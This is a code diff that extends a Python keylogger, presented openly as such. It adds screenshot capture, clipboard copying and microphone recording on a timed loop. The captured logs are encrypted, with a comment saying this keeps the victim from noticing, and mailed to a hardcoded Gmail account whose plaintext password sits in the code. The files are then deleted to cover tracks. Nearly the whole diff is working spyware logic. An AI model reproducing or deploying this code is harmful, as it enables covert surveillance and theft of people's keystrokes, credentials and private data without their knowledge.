@@ -38,12 +38,29 @@ from PIL import ImageGrab  # screenshot library
 keys_information = "key_log.txt"
 system_information = "system_info.txt"
 clipboard_information = "clipboard_info.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
+
+# Encryption Variables (we encrypt the files because when these files are on the victim system , they dont find about it)
+
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_system_info.txt"
+clipboard_information_e = "e_clipboard_info.txt"
+
 microphone_time = 10  # time in seconds
+time_iteration = 15
+number_of_iterations_end = 3
+
 email_address = "trashkeylogger@gmail.com"  # trash email address
 password = "fyylgrzcjqftecbt"
+username = getpass.getuser()
+
 toaddr = "trashkeylogger@gmail.com"
+key = "Kvmz5UCdx9ctZ3Sd9NZNybmC_hbKfagfVRW6dknZ4ro="  # key for encryption
+
 file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
 extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file
+file_merge = file_path + extend
 
 # Email Functionality
 
@@ -124,42 +141,113 @@ copy_clipboard()
 # getting Audio Information
 
 def microphone():
-    fs = 44100  # sample frequency rate
+    fs = 44100  # sample frequency rate  (frame sampling)
     seconds = microphone_time
 
+    # using the record library to record the audio
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()  # wait until the recording is finished
+
+    write(file_path + extend + audio_information,
+          fs, myrecording)  # save the audio file
 
 
-# Key Logger Functionality
+# microphone()
+
+# getting Screenshot Information
+
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+
+screenshot()
+
+number_of_iterations = 0
+currentTime = time.time()
+# time_iteration is the time in seconds
+stoppingTime = time.time() + time_iteration
+
+# Timer For KeyLogger
+
+while number_of_iterations < number_of_iterations_end:
+
+    # Key Logger Functionality
+    count = 0
+    keys = []
+
+    def on_press(key):
+        global keys, count, currentTime
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            write_file(keys)  # write the keys in the file
+            keys = []
+
+    def write_file(keys):
+        with open(file_path + extend + keys_information, "a") as f:  # a is used to append the file
+            for key in keys:
+                # replace the single quotes with nothing
+                k = str(key).replace("'", "")
+                if "space" in k:  # if space is pressed then add a space
+                    f.write('\n')
+                elif "Key" not in k:
+                    f.write(k)
+
+    def on_release(key):
+        if key == Key.esc:  # if escape key is pressed then stop the keylogger
+            return False
+        if currentTime > stoppingTime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
+
+        screenshot()
+        copy_clipboard()
+        send_email(screenshot_information, file_path +
+                   extend + screenshot_information, toaddr)
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
+
+# empty lists for encryption
+
+files_to_encrypt = [file_merge + system_information, file_merge +
+                    clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e,
+                        file_merge + clipboard_information_e, file_merge + keys_information_e]
+
 count = 0
-keys = []
 
+for encrypting_files in files_to_encrypt:
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
 
-def on_press(key):
-    global keys, count
-    keys.append(key)
+    fernet = Fernet(key)  # Fernet is a class that is used to encrypt the data
+    encrypted = fernet.encrypt(data)  # encrypt the data
+
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write(encrypted)  # write the encrypted data to the file
+
+    send_email(encrypted_file_names[count],
+               encrypted_file_names[count], toaddr)
     count += 1
-    if count >= 1:
-        count = 0
-        write_file(keys)  # write the keys in the file
-        keys = []
 
+time.sleep(120)  # sleep for 2 minutes
 
-def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:  # a is used to append the file
-        for key in keys:
-            # replace the single quotes with nothing
-            k = str(key).replace("'", "")
-            if "space" in k:  # if space is pressed then add a space
-                f.write('\n')
-            elif "Key" not in k:
-                f.write(k)
+# Clean up our tracks and delete the files
 
-
-def on_release(key):
-    if key == Key.esc:  # if escape key is pressed then stop the keylogger
-        return False
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+delete_files = [system_information, clipboard_information,
+                keys_information, screenshot_information, audio_information]
+for files in delete_files:
+    os.remove(file_path + files)
